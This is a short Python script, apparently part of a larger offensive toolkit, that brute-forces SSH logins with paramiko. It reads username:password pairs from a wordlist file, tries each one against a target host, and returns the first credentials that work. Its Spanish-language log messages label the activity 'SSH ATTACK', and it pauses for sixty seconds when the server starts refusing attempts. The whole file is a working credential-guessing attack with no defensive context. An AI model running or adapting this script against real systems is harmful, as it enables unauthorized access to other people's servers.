import paramiko
import socket
import time
import logging
import os
current_folder = os.getcwd()

def is_ssh_open(host):
    user_pass_list = open(current_folder + '/tools/ssh_user_pass.txt', 'r')
    for line in user_pass_list:
        line.split(':')
        user = line.split(':')[0]
        passwd = line.split(':')[1].strip()
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=host, username=user, password=passwd, timeout=3)
            return(host, user,passwd)
        except socket.timeout:
            logging.error(f"| SSH ATTACK | No se pudo conectar a {host}")
            return False
        except paramiko.AuthenticationException:
            logging.warning(f"| SSH ATTACK | {user}:{passwd} Credenciales no válidas")
        except paramiko.SSHException:
            logging.error(f"| SSH ATTACK | Máximo de intentos alcanzado")
            time.sleep(60)